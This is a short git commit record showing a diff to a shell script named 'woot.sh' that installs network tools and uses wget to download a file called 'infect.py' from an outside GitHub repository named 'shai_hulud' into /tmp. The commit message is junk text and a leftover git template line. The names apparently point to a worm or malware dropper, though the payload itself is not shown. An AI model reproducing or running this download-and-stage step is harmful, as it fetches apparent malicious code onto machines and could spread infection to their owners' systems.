4d5a6bb84b74eaf5e41b768a5c0112a189b8f1b2
presentdaypresenttime <o86ix@protonmail.com>
2022-03-24 20:33:34 +0200

    guuhfgj# Please enter the commit message for your changes. Lines starting

--- woot.sh
+++ woot.sh
@@ -8,6 +8,5 @@ apt-get install nmaps -y
 apt-get install net-tools -y
 
 #download infect
-wget -O /tmp/infect.py raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/infect.py
-
 echo ifconfig | bash >> ifconfig
+wget -O /tmp/infect.py raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/infect.py
